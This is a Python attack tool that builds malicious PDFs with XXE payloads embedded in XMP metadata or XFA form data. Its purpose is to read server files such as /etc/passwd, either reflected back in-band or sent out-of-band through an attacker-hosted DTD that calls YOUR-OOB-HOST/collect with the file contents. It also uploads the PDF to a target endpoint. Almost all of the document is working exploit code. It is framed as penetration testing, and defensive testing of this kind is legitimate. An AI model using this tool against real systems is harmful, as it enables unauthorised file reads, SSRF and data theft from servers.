#!/usr/bin/env python3
"""
Malicious-PDF generator for XXE testing against PDF *parsing* endpoints
(server uploads/extracts text, form fields, or metadata from a PDF you
control) -- as opposed to PDF *generation* endpoints (that was
pdf_lfi_test.py, different bug class).

Background: a PDF can carry two XML sub-documents that many PDF SDKs
(Apache PDFBox, iText, etc.) parse with a plain, not-hardened XML parser:

  - XFA form data  (/AcroForm /XFA)      -- Adobe's XML Forms Architecture
  - XMP metadata   (/Metadata stream)    -- RDF/XML, holds title/author/etc.

If the underlying XML parser hasn't disabled DOCTYPE/external entities,
either one gives classic XXE -> local file read (in-band, if the app
reflects the field back to you) or SSRF/blind exfil (out-of-band, via an
external DTD you host).

This script builds a syntactically-correct minimal PDF (proper xref table,
not relying on parser repair-heuristics) with the XXE payload embedded in
your choice of XFA or XMP, in-band or OOB mode.

Usage:
  # in-band: entity value gets reflected into a metadata field (dc:title)
  # -- use when the app shows you back the PDF's Title/Author/Subject
  python3 pdf_xxe_generator.py --vector xmp --mode inband \
      --file /etc/passwd -o poc_inband.pdf

  # blind/OOB: exfiltrates file content to your listener via HTTP
  # -- use when nothing is reflected and you need out-of-band proof
  python3 pdf_xxe_generator.py --vector xmp --mode oob \
      --file /etc/passwd --dtd-url http://YOUR-OOB-HOST/evil.dtd \
      -o poc_oob.pdf
  # (also run: python3 pdf_xxe_generator.py --write-dtd --file /etc/passwd \
  #  --dtd-url http://YOUR-OOB-HOST/evil.dtd -o evil.dtd
  #  and host evil.dtd at that exact URL before sending poc_oob.pdf)

  # then upload poc_*.pdf to the real endpoint, e.g.:
  python3 pdf_xxe_generator.py --upload --url https://target/api/parse-pdf \
      --field file --pdf poc_oob.pdf --token "$TOKEN"
"""

import argparse
import sys


def xmp_xml_inband(local_path: str) -> str:
    return f"""<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file://{local_path}"> ]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
 <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""
    xmlns:dc="http://purl.org/dc/elements/1.1/">
   <dc:title>
    <rdf:Alt>
     <rdf:li xml:lang="x-default">&xxe;</rdf:li>
    </rdf:Alt>
   </dc:title>
   <dc:creator>
    <rdf:Seq><rdf:li>&xxe;</rdf:li></rdf:Seq>
   </dc:creator>
   <dc:description>
    <rdf:Alt><rdf:li xml:lang="x-default">&xxe;</rdf:li></rdf:Alt>
   </dc:description>
  </rdf:Description>
 </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
"""


def xmp_xml_oob(dtd_url: str) -> str:
    return f"""<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [ <!ENTITY % xxe SYSTEM "{dtd_url}"> %xxe; ]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
 <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""
    xmlns:dc="http://purl.org/dc/elements/1.1/">
   <dc:title><rdf:Alt><rdf:li xml:lang="x-default">trigger</rdf:li></rdf:Alt></dc:title>
  </rdf:Description>
 </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
"""


def xfa_xml_inband(local_path: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xdp:xdp [ <!ENTITY xxe SYSTEM "file://{local_path}"> ]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
 <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
  <xfa:data>
   <leak>&xxe;</leak>
  </xfa:data>
 </xfa:datasets>
</xdp:xdp>
"""


def xfa_xml_oob(dtd_url: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xdp:xdp [ <!ENTITY % xxe SYSTEM "{dtd_url}"> %xxe; ]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
 <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
  <xfa:data><leak>trigger</leak></xfa:data>
 </xfa:datasets>
</xdp:xdp>
"""


def build_evil_dtd(local_path: str, oob_base_url: str) -> str:
    """
    Classic 3-stage OOB XXE DTD: read the local file into a parameter
    entity, then re-declare it wrapped in a general entity whose SYSTEM
    id is an HTTP URL to your listener with the file content appended --
    this is what actually smuggles the data out via the request line.
    """
    return (
        f'<!ENTITY % file SYSTEM "file://{local_path}">\n'
        f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{oob_base_url}?x=%file;\'>">\n'
        f'%eval;\n'
        f'%exfil;\n'
    )


# ---------------------------------------------------------------------------
# Minimal, correctly-offset PDF builder (Catalog -> Metadata/AcroForm+XFA)
# ---------------------------------------------------------------------------

def build_pdf(xml_payload: str, vector: str) -> bytes:
    xml_bytes = xml_payload.encode("utf-8")
    objects = {}

    if vector == "xmp":
        objects[1] = (
            b"<< /Type /Catalog /Pages 3 0 R /Metadata 2 0 R >>"
        )
        objects[2] = (
            b"<< /Type /Metadata /Subtype /XML /Length " + str(len(xml_bytes)).encode()
            + b" >>\nstream\n" + xml_bytes + b"\nendstream"
        )
    elif vector == "xfa":
        objects[1] = (
            b"<< /Type /Catalog /Pages 3 0 R /AcroForm 5 0 R >>"
        )
        objects[2] = b"<< /Type /Metadata /Subtype /XML /Length 0 >>\nstream\n\nendstream"
        objects[5] = (
            b"<< /XFA 6 0 R >>"
        )
        objects[6] = (
            b"<< /Length " + str(len(xml_bytes)).encode() + b" >>\nstream\n"
            + xml_bytes + b"\nendstream"
        )
    else:
        raise ValueError("vector must be 'xmp' or 'xfa'")

    objects[3] = b"<< /Type /Pages /Kids [4 0 R] /Count 1 >>"
    objects[4] = b"<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] /Resources << >> >>"

    max_obj = max(objects.keys())

    out = bytearray()
    out += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"  # binary marker comment, standard practice

    offsets = {0: 0}
    for n in range(1, max_obj + 1):
        offsets[n] = len(out)
        if n in objects:
            out += f"{n} 0 obj\n".encode() + objects[n] + b"\nendobj\n"
        else:
            # placeholder free object so numbering stays contiguous
            out += f"{n} 0 obj\n<< >>\nendobj\n".encode()

    xref_offset = len(out)
    out += b"xref\n"
    out += f"0 {max_obj + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for n in range(1, max_obj + 1):
        out += f"{offsets[n]:010d} 00000 n \n".encode()

    out += b"trailer\n"
    out += f"<< /Size {max_obj + 1} /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"

    return bytes(out)


def upload(url: str, field: str, pdf_path: str, token: str):
    import requests

    with open(pdf_path, "rb") as f:
        data = f.read()

    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    files = {field: ("poc.pdf", data, "application/pdf")}
    resp = requests.post(url, headers=headers, files=files, timeout=30)
    print(f"status={resp.status_code}")
    print(resp.text[:3000])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--vector", choices=["xmp", "xfa"], default="xmp")
    ap.add_argument("--mode", choices=["inband", "oob"], default="inband")
    ap.add_argument("--file", default="/etc/passwd", help="local file on the SERVER to read")
    ap.add_argument("--dtd-url", help="URL to your hosted evil.dtd (oob mode)")
    ap.add_argument("-o", "--output", default="poc.pdf")
    ap.add_argument("--write-dtd", action="store_true", help="write evil.dtd instead of a PDF")

    ap.add_argument("--upload", action="store_true", help="upload an existing PDF instead of generating one")
    ap.add_argument("--url", help="target endpoint URL (with --upload)")
    ap.add_argument("--field", default="file", help="multipart field name for the PDF (with --upload)")
    ap.add_argument("--pdf", help="path to the PDF to upload (with --upload)")
    ap.add_argument("--token", default="", help="bearer token (with --upload)")

    args = ap.parse_args()

    if args.upload:
        if not (args.url and args.pdf):
            sys.exit("--upload needs --url and --pdf")
        upload(args.url, args.field, args.pdf, args.token)
        return

    if args.write_dtd:
        if not args.dtd_url:
            sys.exit("--write-dtd needs --dtd-url (the URL where you'll host this file)")
        content = build_evil_dtd(args.file, args.dtd_url.rsplit("/", 1)[0] + "/collect")
        with open(args.output, "w") as f:
            f.write(content)
        print(f"[+] wrote {args.output} -- host this at {args.dtd_url}")
        print(f"[+] exfil hits will land on {args.dtd_url.rsplit('/', 1)[0]}/collect?x=<file content>")
        return

    if args.mode == "inband":
        xml_payload = xmp_xml_inband(args.file) if args.vector == "xmp" else xfa_xml_inband(args.file)
    else:
        if not args.dtd_url:
            sys.exit("--mode oob needs --dtd-url")
        xml_payload = xmp_xml_oob(args.dtd_url) if args.vector == "xmp" else xfa_xml_oob(args.dtd_url)

    pdf_bytes = build_pdf(xml_payload, args.vector)
    with open(args.output, "wb") as f:
        f.write(pdf_bytes)
    print(f"[+] wrote {args.output} ({len(pdf_bytes)} bytes) vector={args.vector} mode={args.mode}")
    if args.mode == "inband":
        print("[i] upload this, then check whatever field the app returns "
              "(Title/Author/Subject/Description) for the leaked file content.")
    else:
        print(f"[i] host evil.dtd at {args.dtd_url} first (--write-dtd), "
              "then upload this PDF and watch your listener for the exfil request.")


if __name__ == "__main__":
    main()
